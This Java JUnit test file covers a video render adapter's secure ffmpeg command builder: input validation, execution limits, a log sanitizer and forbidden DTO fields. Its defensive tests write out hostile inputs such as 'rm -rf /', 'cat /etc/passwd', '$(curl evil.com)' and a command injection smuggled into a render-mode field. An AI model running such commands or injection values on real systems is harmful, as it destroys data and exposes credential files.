package com.anadoluatlasi.backend.turkuvideo;

import com.anadoluatlasi.backend.review.*;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.springframework.web.bind.annotation.DeleteMapping;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.PutMapping;

import java.lang.reflect.Field;
import java.util.*;
import java.util.stream.Collectors;

import static org.assertj.core.api.Assertions.*;

/**
 * FP-023 Task 02: Render Adapter Contract + Secure Command Builder tests.
 */
@DisplayName("FP-023 Task 02 \u2014 Render Adapter Contract + Secure Command Builder")
class TurkuRenderAdapterContractTest {

    private TurkuRenderAdapterPolicy policy;
    private TurkuFfmpegCommandBuilder builder;
    private TurkuFfmpegExecutionLimits defaultLimits;

    @BeforeEach
    void setUp() {
        policy = new TurkuRenderAdapterPolicy();
        builder = new TurkuFfmpegCommandBuilder(policy);
        defaultLimits = new TurkuFfmpegExecutionLimits();
    }

    // ── A. Endpoint Inventory (unchanged) ──

    @Nested
    @DisplayName("A. Endpoint Inventory (44 = 25 POST + 19 GET)")
    class EndpointInventory {

        @Test
        @DisplayName("total 44 = 25 POST + 19 GET")
        void totalEndpoints() {
            long post = countMethods(AdminReviewController.class, PostMapping.class)
                    + countMethods(AdminPipelineController.class, PostMapping.class)
                    + countMethods(AdminWorkflowObservabilityController.class, PostMapping.class)
                    + countMethods(TurkuVideoProjectController.class, PostMapping.class);
            long get = countMethods(AdminReviewController.class, GetMapping.class)
                    + countMethods(AdminPipelineController.class, GetMapping.class)
                    + countMethods(AdminWorkflowObservabilityController.class, GetMapping.class)
                    + countMethods(TurkuVideoProjectController.class, GetMapping.class);
            assertThat(post).as("total POST").isEqualTo(25);
            assertThat(get).as("total GET").isEqualTo(19);
            assertThat(post + get).as("total endpoints").isEqualTo(44);
        }

        @Test
        @DisplayName("no PUT/DELETE endpoints")
        void noUnsafe() {
            assertThat(countMethods(TurkuVideoProjectController.class, PutMapping.class)).isEqualTo(0);
            assertThat(countMethods(TurkuVideoProjectController.class, DeleteMapping.class)).isEqualTo(0);
        }

        private long countMethods(Class<?> c, Class<? extends java.lang.annotation.Annotation> ann) {
            return Arrays.stream(c.getDeclaredMethods())
                    .filter(m -> m.isAnnotationPresent(ann)).count();
        }
    }

    // ── B. Adapter Modes ──

    @Nested
    @DisplayName("B. Adapter Modes")
    class AdapterModes {

        @Test
        @DisplayName("enum has 5 values")
        void modeCount() {
            assertThat(TurkuRenderAdapterMode.values()).hasSize(5);
        }

        @Test
        @DisplayName("STUB mode exists")
        void stubMode() {
            assertThat(TurkuRenderAdapterMode.valueOf("STUB")).isNotNull();
        }

        @Test
        @DisplayName("FFMPEG_DISABLED mode exists")
        void disabledMode() {
            assertThat(TurkuRenderAdapterMode.valueOf("FFMPEG_DISABLED")).isNotNull();
        }

        @Test
        @DisplayName("FFMPEG_READY mode exists")
        void readyMode() {
            assertThat(TurkuRenderAdapterMode.valueOf("FFMPEG_READY")).isNotNull();
        }

        @Test
        @DisplayName("no forbidden modes")
        void noForbidden() {
            var modes = Arrays.stream(TurkuRenderAdapterMode.values())
                    .map(Enum::name).collect(Collectors.toSet());
            assertThat(modes).doesNotContain(
                    "AUTO_APPROVE", "PUBLISH", "EXPORT", "DOWNLOAD", "PUBLIC");
        }
    }

    // ── C. Adapter Failure Codes ──

    @Nested
    @DisplayName("C. Adapter Failure Codes")
    class FailureCodes {

        @Test
        @DisplayName("enum has 8 values")
        void codeCount() {
            assertThat(TurkuRenderAdapterFailureCode.values()).hasSize(8);
        }

        @Test
        @DisplayName("all expected codes present")
        void allCodes() {
            assertThat(TurkuRenderAdapterFailureCode.valueOf("RENDER_PROVIDER_DISABLED")).isNotNull();
            assertThat(TurkuRenderAdapterFailureCode.valueOf("RENDER_CONFIG_MISSING")).isNotNull();
            assertThat(TurkuRenderAdapterFailureCode.valueOf("RENDER_INPUT_MISSING")).isNotNull();
            assertThat(TurkuRenderAdapterFailureCode.valueOf("RENDER_TIMEOUT")).isNotNull();
            assertThat(TurkuRenderAdapterFailureCode.valueOf("RENDER_PROCESS_FAILED")).isNotNull();
            assertThat(TurkuRenderAdapterFailureCode.valueOf("RENDER_OUTPUT_REJECTED")).isNotNull();
            assertThat(TurkuRenderAdapterFailureCode.valueOf("RENDER_SECURITY_VIOLATION")).isNotNull();
            assertThat(TurkuRenderAdapterFailureCode.valueOf("RENDER_FAILED_SAFE")).isNotNull();
        }
    }

    // ── D. Safety Envelope ──

    @Nested
    @DisplayName("D. Safety Envelope")
    class SafetyEnvelopeTests {

        @Test
        @DisplayName("immutable safety defaults")
        void defaults() {
            var env = new TurkuRenderAdapterSafetyEnvelope(TurkuRenderAdapterMode.STUB);
            assertThat(env.isHumanReviewRequired()).isTrue();
            assertThat(env.isCopyrightReviewRequired()).isTrue();
            assertThat(env.isAutoApproved()).isFalse();
            assertThat(env.isNotPublishReady()).isTrue();
            assertThat(env.isNotExportReady()).isTrue();
        }

        @Test
        @DisplayName("safety flags present")
        void safetyFlags() {
            var env = new TurkuRenderAdapterSafetyEnvelope(TurkuRenderAdapterMode.STUB);
            assertThat(env.getSafetyFlags()).contains(
                    "NO_REAL_RENDER", "NO_BINARY_OUTPUT",
                    "NO_PUBLIC_DELIVERY", "NO_EXPORT",
                    "NO_SHELL_EXECUTION", "NO_USER_ARGS");
        }

        @Test
        @DisplayName("review flags present")
        void reviewFlags() {
            var env = new TurkuRenderAdapterSafetyEnvelope(TurkuRenderAdapterMode.STUB);
            assertThat(env.getReviewFlags()).contains(
                    "HUMAN_REVIEW_REQUIRED", "NOT_PUBLISH_READY", "NOT_EXPORT_READY");
        }
    }

    // ── E. Adapter Policy ──

    @Nested
    @DisplayName("E. Adapter Policy")
    class PolicyTests {

        @Test
        @DisplayName("resolves STUB when not enabled")
        void stubDefault() {
            assertThat(policy.resolveMode(false, false))
                    .isEqualTo(TurkuRenderAdapterMode.STUB);
        }

        @Test
        @DisplayName("resolves CONFIG_MISSING when enabled but no config")
        void configMissing() {
            assertThat(policy.resolveMode(true, false))
                    .isEqualTo(TurkuRenderAdapterMode.FFMPEG_CONFIG_MISSING);
        }

        @Test
        @DisplayName("resolves FFMPEG_READY when enabled and config present")
        void ffmpegReady() {
            assertThat(policy.resolveMode(true, true))
                    .isEqualTo(TurkuRenderAdapterMode.FFMPEG_READY);
        }

        @Test
        @DisplayName("detects shell metacharacters")
        void shellMeta() {
            assertThat(policy.isShellMetacharacter("rm -rf /")).isTrue();
            assertThat(policy.isShellMetacharacter("echo hello && cat /etc/passwd")).isTrue();
            assertThat(policy.isShellMetacharacter("$(curl evil.com)")).isTrue();
            assertThat(policy.isShellMetacharacter("`whoami`")).isTrue();
            assertThat(policy.isShellMetacharacter("safe-arg")).isFalse();
        }

        @Test
        @DisplayName("detects forbidden input patterns")
        void forbiddenInput() {
            assertThat(policy.isForbiddenInput("publicUrl=http://evil.com")).isTrue();
            assertThat(policy.isForbiddenInput("signedUrl=abc")).isTrue();
            assertThat(policy.isForbiddenInput("cdnUrl=abc")).isTrue();
            assertThat(policy.isForbiddenInput("storageKey=abc")).isTrue();
            assertThat(policy.isForbiddenInput("base64data")).isTrue();
            assertThat(policy.isForbiddenInput("Bearer token123")).isTrue();
            assertThat(policy.isForbiddenInput("Authorization: basic")).isTrue();
            assertThat(policy.isForbiddenInput("internal-ref:uuid")).isFalse();
        }

        @Test
        @DisplayName("rejects HTTP/S URLs")
        void rejectsUrls() {
            assertThat(policy.isShellMetacharacter("http://cdn.example.com/video.mp4")).isTrue();
            assertThat(policy.isShellMetacharacter("https://storage.example.com/key")).isTrue();
            assertThat(policy.isShellMetacharacter("s3://bucket/key")).isTrue();
        }
    }

    // ── F. Command Builder ──

    @Nested
    @DisplayName("F. Secure Command Builder")
    class CommandBuilderTests {

        private TurkuRenderExecutionPlan validPlan() {
            return new TurkuRenderExecutionPlan(
                    UUID.randomUUID(), 5, 120.0, "1920x1080", 30, "mp4",
                    60.0, "deterministic-stub", "DETERMINISTIC_STUB");
        }

        @Test
        @DisplayName("builds valid plan")
        void validBuild() {
            var plan = builder.buildPlan(validPlan(), defaultLimits);
            assertThat(plan.isValidated()).isTrue();
            assertThat(plan.getValidationError()).isNull();
            assertThat(plan.getExecutableToken()).isEqualTo("ffmpeg");
            assertThat(plan.getSafeArgs()).isNotEmpty();
        }

        @Test
        @DisplayName("safe args contain no shell metacharacters")
        void noShellInArgs() {
            var plan = builder.buildPlan(validPlan(), defaultLimits);
            for (String arg : plan.getSafeArgs()) {
                assertThat(policy.isShellMetacharacter(arg))
                        .as("arg '%s' should be safe", arg).isFalse();
            }
        }

        @Test
        @DisplayName("safe args contain no forbidden input")
        void noForbiddenInArgs() {
            var plan = builder.buildPlan(validPlan(), defaultLimits);
            for (String arg : plan.getSafeArgs()) {
                assertThat(policy.isForbiddenInput(arg))
                        .as("arg '%s' should not be forbidden", arg).isFalse();
            }
        }

        @Test
        @DisplayName("rejects null execution plan")
        void rejectsNull() {
            var plan = builder.buildPlan(null, defaultLimits);
            assertThat(plan.isValidated()).isFalse();
        }

        @Test
        @DisplayName("rejects unsupported format")
        void rejectsBadFormat() {
            var ep = new TurkuRenderExecutionPlan(
                    UUID.randomUUID(), 5, 120.0, "1920x1080", 30, "avi",
                    60.0, "stub", "STUB");
            var plan = builder.buildPlan(ep, defaultLimits);
            assertThat(plan.isValidated()).isFalse();
            assertThat(plan.getValidationError()).contains("format");
        }

        @Test
        @DisplayName("rejects oversized resolution")
        void rejectsOversized() {
            var ep = new TurkuRenderExecutionPlan(
                    UUID.randomUUID(), 5, 120.0, "7680x4320", 30, "mp4",
                    60.0, "stub", "STUB");
            var plan = builder.buildPlan(ep, defaultLimits);
            assertThat(plan.isValidated()).isFalse();
            assertThat(plan.getValidationError()).contains("Resolution");
        }

        @Test
        @DisplayName("rejects excessive FPS")
        void rejectsHighFps() {
            var ep = new TurkuRenderExecutionPlan(
                    UUID.randomUUID(), 5, 120.0, "1920x1080", 120, "mp4",
                    60.0, "stub", "STUB");
            var plan = builder.buildPlan(ep, defaultLimits);
            assertThat(plan.isValidated()).isFalse();
            assertThat(plan.getValidationError()).contains("FPS");
        }

        @Test
        @DisplayName("rejects excessive duration")
        void rejectsLongDuration() {
            var ep = new TurkuRenderExecutionPlan(
                    UUID.randomUUID(), 5, 9999.0, "1920x1080", 30, "mp4",
                    60.0, "stub", "STUB");
            var plan = builder.buildPlan(ep, defaultLimits);
            assertThat(plan.isValidated()).isFalse();
            assertThat(plan.getValidationError()).contains("Duration");
        }

        @Test
        @DisplayName("rejects shell metacharacters in render mode")
        void rejectsShellInMode() {
            var ep = new TurkuRenderExecutionPlan(
                    UUID.randomUUID(), 5, 120.0, "1920x1080", 30, "mp4",
                    60.0, "stub", "STUB && rm -rf /");
            var plan = builder.buildPlan(ep, defaultLimits);
            assertThat(plan.isValidated()).isFalse();
        }

        @Test
        @DisplayName("validateArg rejects URLs")
        void rejectsUrlArg() {
            assertThat(builder.validateArg("http://evil.com")).isFalse();
            assertThat(builder.validateArg("https://cdn.example.com")).isFalse();
        }

        @Test
        @DisplayName("validateArg rejects base64")
        void rejectsBase64Arg() {
            assertThat(builder.validateArg("base64encodedData")).isFalse();
        }

        @Test
        @DisplayName("validateArg rejects storageKey")
        void rejectsStorageKeyArg() {
            assertThat(builder.validateArg("storageKey=abc123")).isFalse();
        }

        @Test
        @DisplayName("validateArg accepts safe values")
        void acceptsSafe() {
            assertThat(builder.validateArg("1920x1080")).isTrue();
            assertThat(builder.validateArg("mp4")).isTrue();
            assertThat(builder.validateArg("libx264")).isTrue();
            assertThat(builder.validateArg("internal-ref:uuid")).isTrue();
        }

        @Test
        @DisplayName("webm format uses vp9 codec")
        void webmCodec() {
            var ep = new TurkuRenderExecutionPlan(
                    UUID.randomUUID(), 5, 120.0, "1920x1080", 30, "webm",
                    60.0, "stub", "STUB");
            var plan = builder.buildPlan(ep, defaultLimits);
            assertThat(plan.isValidated()).isTrue();
            assertThat(plan.getSafeArgs()).contains("libvpx-vp9");
        }
    }

    // ── G. Execution Limits ──

    @Nested
    @DisplayName("G. Execution Limits")
    class LimitsTests {

        @Test
        @DisplayName("default limits")
        void defaults() {
            assertThat(defaultLimits.getTimeoutSeconds()).isEqualTo(300);
            assertThat(defaultLimits.getMaxDurationSeconds()).isEqualTo(600);
            assertThat(defaultLimits.getMaxFileSizeMb()).isEqualTo(500);
            assertThat(defaultLimits.getMaxWidth()).isEqualTo(1920);
            assertThat(defaultLimits.getMaxHeight()).isEqualTo(1080);
            assertThat(defaultLimits.getMaxFps()).isEqualTo(30);
        }

        @Test
        @DisplayName("clamps to max")
        void clampsMax() {
            var limits = new TurkuFfmpegExecutionLimits(9999, 9999, 9999, 9999, 9999, 9999);
            assertThat(limits.getTimeoutSeconds()).isEqualTo(600);
            assertThat(limits.getMaxDurationSeconds()).isEqualTo(900);
            assertThat(limits.getMaxFileSizeMb()).isEqualTo(1024);
            assertThat(limits.getMaxWidth()).isEqualTo(3840);
            assertThat(limits.getMaxHeight()).isEqualTo(2160);
            assertThat(limits.getMaxFps()).isEqualTo(60);
        }

        @Test
        @DisplayName("clamps to min")
        void clampsMin() {
            var limits = new TurkuFfmpegExecutionLimits(-1, -1, -1, -1, -1, -1);
            assertThat(limits.getTimeoutSeconds()).isEqualTo(1);
            assertThat(limits.getMaxDurationSeconds()).isEqualTo(1);
            assertThat(limits.getMaxFileSizeMb()).isEqualTo(1);
            assertThat(limits.getMaxWidth()).isEqualTo(1);
            assertThat(limits.getMaxHeight()).isEqualTo(1);
            assertThat(limits.getMaxFps()).isEqualTo(1);
        }
    }

    // ── H. Trace Reference ──

    @Nested
    @DisplayName("H. Trace Reference")
    class TraceReferenceTests {

        @Test
        @DisplayName("trace ref is opaque")
        void opaqueRef() {
            var trace = new TurkuRenderAdapterTraceReference(TurkuRenderAdapterMode.STUB);
            assertThat(trace.getTraceRef()).startsWith("stub-trace:");
            assertThat(trace.getTraceRef()).doesNotContain(
                    "http", "file://", "/", "\\", ".mp4", "storage", "cdn");
        }

        @Test
        @DisplayName("ffmpeg trace ref prefix")
        void ffmpegRef() {
            var trace = new TurkuRenderAdapterTraceReference(TurkuRenderAdapterMode.FFMPEG_READY);
            assertThat(trace.getTraceRef()).startsWith("ffmpeg_ready-trace:");
        }
    }

    // ── I. Sanitizer ──

    @Nested
    @DisplayName("I. Sanitizer")
    class SanitizerTests {

        private final TurkuRenderAdapterSanitizer sanitizer = new TurkuRenderAdapterSanitizer();

        @Test
        @DisplayName("sanitizes passwords")
        void passwords() {
            assertThat(sanitizer.sanitizeMessage("Error password=abc123"))
                    .doesNotContain("abc123");
        }

        @Test
        @DisplayName("sanitizes file paths")
        void paths() {
            assertThat(sanitizer.sanitizeMessage("Error at /usr/local/bin/ffmpeg"))
                    .doesNotContain("/usr/local");
        }

        @Test
        @DisplayName("sanitizes URLs")
        void urls() {
            assertThat(sanitizer.sanitizeMessage("Error: https://cdn.example.com/key"))
                    .doesNotContain("cdn.example.com");
        }

        @Test
        @DisplayName("truncates long messages")
        void truncates() {
            String longMsg = "x".repeat(500);
            assertThat(sanitizer.sanitizeMessage(longMsg).length()).isLessThanOrEqualTo(203);
        }

        @Test
        @DisplayName("sanitizes trace refs with paths")
        void traceRefPaths() {
            assertThat(sanitizer.sanitizeTraceRef("/usr/local/trace"))
                    .startsWith("sanitized-trace:");
            assertThat(sanitizer.sanitizeTraceRef("http://evil.com"))
                    .startsWith("sanitized-trace:");
        }

        @Test
        @DisplayName("passes safe trace refs")
        void safeTrace() {
            assertThat(sanitizer.sanitizeTraceRef("stub-trace:abc-123"))
                    .isEqualTo("stub-trace:abc-123");
        }
    }

    // ── J. DTO Safety ──

    @Nested
    @DisplayName("J. DTO Safety \u2014 Forbidden Fields")
    class DtoSafety {

        private static final List<String> FORBIDDEN = List.of(
                "rawPayload", "rawProviderResponse", "rawRendererPayload",
                "token", "jwt", "session", "credential", "password", "secret",
                "apiKey", "authorizationHeader", "principalRaw",
                "publicUrl", "signedUrl", "cdnUrl", "exportUrl", "publishUrl",
                "downloadUrl", "storageKey", "base64", "imageData", "binaryData",
                "lyrics", "videoData", "audioData",
                "renderedVideo", "videoFile", "downloadFile", "videoStream",
                "filePath", "renderedVideoUrl", "commandLine", "ffmpegCommand",
                "shellCommand", "processArgs", "absolutePath");

        @Test
        @DisplayName("TurkuRenderAdapterRequest safe")
        void request() { assertNoForbidden(TurkuRenderAdapterRequest.class); }

        @Test
        @DisplayName("TurkuRenderAdapterResult safe")
        void result() { assertNoForbidden(TurkuRenderAdapterResult.class); }

        @Test
        @DisplayName("TurkuRenderAdapterSafetyEnvelope safe")
        void envelope() { assertNoForbidden(TurkuRenderAdapterSafetyEnvelope.class); }

        @Test
        @DisplayName("TurkuRenderAdapterTraceReference safe")
        void trace() { assertNoForbidden(TurkuRenderAdapterTraceReference.class); }

        @Test
        @DisplayName("TurkuFfmpegCommandPlan safe")
        void commandPlan() { assertNoForbidden(TurkuFfmpegCommandPlan.class); }

        @Test
        @DisplayName("TurkuFfmpegInputSpec safe")
        void inputSpec() { assertNoForbidden(TurkuFfmpegInputSpec.class); }

        @Test
        @DisplayName("TurkuFfmpegOutputSpec safe")
        void outputSpec() { assertNoForbidden(TurkuFfmpegOutputSpec.class); }

        @Test
        @DisplayName("TurkuFfmpegExecutionLimits safe")
        void limits() { assertNoForbidden(TurkuFfmpegExecutionLimits.class); }

        private void assertNoForbidden(Class<?> clazz) {
            Set<String> fields = Arrays.stream(clazz.getDeclaredFields())
                    .map(Field::getName).collect(Collectors.toSet());
            for (String f : FORBIDDEN) {
                assertThat(fields).as("field '%s' in %s", f, clazz.getSimpleName())
                        .doesNotContain(f);
            }
        }
    }

    // ── K. Stub Runner Compatibility ──

    @Nested
    @DisplayName("K. Stub Runner Compatibility")
    class StubCompatibility {

        @Test
        @DisplayName("stub runner still works")
        void stubWorks() {
            var runner = new StubTurkuRenderRunnerGateway();
            var plan = new TurkuRenderExecutionPlan(
                    UUID.randomUUID(), 3, 120.0, "1920x1080", 30, "mp4",
                    60.0, "deterministic-stub", "DETERMINISTIC_STUB");
            var result = runner.execute(plan);
            assertThat(result.isSuccess()).isTrue();
            assertThat(result.getArtifact()).isNotNull();
            assertThat(result.getArtifact().getArtifactRef()).startsWith("internal-stub-artifact:");
        }

        @Test
        @DisplayName("stub runner interface unchanged")
        void interfaceUnchanged() {
            assertThat(TurkuRenderRunnerGateway.class.isInterface()).isTrue();
            assertThat(TurkuRenderRunnerGateway.class.getDeclaredMethods()).hasSize(1);
        }
    }
}
